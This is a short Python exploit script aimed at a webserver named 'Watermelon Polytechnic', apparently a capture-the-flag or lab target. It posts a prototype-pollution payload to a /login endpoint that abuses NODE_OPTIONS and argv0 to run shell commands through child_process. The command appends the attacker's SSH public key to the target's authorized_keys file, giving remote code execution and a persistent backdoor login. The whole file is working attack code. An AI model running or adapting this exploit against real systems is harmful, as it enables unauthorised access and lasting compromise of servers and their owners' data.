import requests
import os
import argparse

def main(url, ssh_key):
    # Clean up the SSH key (remove extra whitespace)
    ssh_key = ssh_key.strip()

    # Build the command that appends the SSH key to authorized_keys.
    # The command executed on the target is:
    # bash -c "echo '<ssh_key>' >> ~/.ssh/authorized_keys"
    persistence_command = f"echo '{ssh_key}' >> ~/.ssh/authorized_keys"
    full_command = f"bash -c \\\"{persistence_command}\\\""

    # The payload is injected via the __proto__ property.
    payload = {
        "username": "",
        "password": "",
        "__proto__": {
            "NODE_OPTIONS": "--require /proc/self/cmdline",
            "argv0": f"console.log(require(\"child_process\").execSync(\"{full_command}\", {{ shell: \"/bin/bash\" }}).toString())//"
        }
    }

    # Send the payload to the target's /login endpoint.
    try:
        response = requests.post(url + "/login", json=payload, verify=False, timeout=10)
        print(f"[+] Payload delivered. HTTP {response.status_code}")
    except Exception as e:
        print(f"[-] Error sending payload: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit for Watermelon Polytechnic's webserver"
    )
    parser.add_argument("-u", "--url", help="Target URL", default="http://127.0.0.1:3000")
    parser.add_argument(
        "-k",
        "--ssh-key",
        help="Path to attacker's SSH public key (default: ~/.ssh/id_rsa.pub)",
        default=os.path.expanduser("~/.ssh/id_rsa.pub")
    )
    args = parser.parse_args()

    # Read the attacker's SSH public key from file.
    try:
        with open(os.path.expanduser(args.ssh_key), "r") as f:
            ssh_key_content = f.read()
    except Exception as e:
        print(f"[-] Could not read SSH key file: {e}")
        exit(1)

    main(args.url, ssh_key_content)
